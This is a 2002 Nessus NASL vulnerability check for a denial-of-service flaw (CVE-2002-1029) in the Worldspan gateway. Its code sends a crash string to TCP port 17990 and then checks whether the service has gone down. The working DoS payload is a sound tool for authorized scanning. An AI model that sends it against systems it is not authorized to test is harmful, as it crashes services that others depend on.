#
# This script was written by Michel Arboi <arboi@alussinan.org>, starting 
# from quake3_dos.nasl and a proof of concept code 
# by <altomo@digitalgangsters.net>
#
# GPL
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#
# References:
# From: "altomo" <altomo@digitalgangsters.net>
# To: bugtraq@securityfocus.com
# Subject: Worldspan DoS
# Date: Thu, 4 Jul 2002 15:22:11 -0500
#

if(description)
{
 script_id(11049);
 script_bugtraq_id(5169);
 script_version("$Revision: 1.7 $");
 script_cve_id("CVE-2002-1029");
 name["english"] = "Worldspan gateway DOS";
 name["francais"] = "Déni de service contre la passerelle Wordspan";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to crash the 
Worldspan gateway by sending illegal data.

A cracker may use this attack to make this service 
crash continuously, preventing you from working.


Solution: upgrade your software

Risk factor : Low";


 desc["francais"] = "Il a été possible de tuer la passerelle
Worldspan en lui envoyant des données invalides.

Un pirate peut exploiter cette faille pour tuer continuellement ce
service, vous empêchant ainsi de travailler.


Solution: mettez à jour votre logiciel

Facteur de risque : Bas";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Wordlspan DoS";
 summary["francais"] = "Déni de service contre Worldspan";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";

 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(17990);
 exit(0);
}

#
# I suspect that the service will be killed by find_service.nes before
# this script can do anything...
#

port = 17990;
s = string("worldspanshouldgoboom\r");

if (! get_port_state(port)) exit(0);
soc = open_sock_tcp(port);
if (!soc) exit(0);

send(socket:soc, data:s);
close(soc);
# According to the advisory, Worldspan eats CPU and crashes after ~ 1 min
sleep(60);
soc = open_sock_tcp(port);
if (! soc)
{
 security_hole(port);
}
if (soc) close(soc);
